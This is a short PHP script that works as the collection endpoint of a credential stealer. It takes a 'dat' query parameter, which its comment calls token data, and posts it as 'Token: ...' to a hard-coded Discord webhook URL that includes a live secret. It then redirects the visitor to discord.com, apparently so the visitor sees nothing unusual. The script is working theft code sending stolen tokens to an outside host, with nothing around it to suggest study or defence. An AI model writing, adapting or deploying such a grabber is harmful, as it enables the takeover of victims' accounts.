<?php

$dat = $_GET['dat']; // Get the token data from the query parameter

// Define the webhook URL and the message to send
$webhook_url = 'https://discord.com/api/webhooks/1082030092768788620/2IXO2_vusGiucZbDgJe83FS0S6oyeCi4ilhUiICgo-f9aLYXT2f-hL65buFgLS3xAGVd';
$message = array('content' => 'Token: ' . $dat);

// Use cURL to send the message to the webhook
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Output the response from the webhook (for testing purposes)
// Redirect back to Discord
header('Location: https://discord.com');

?>
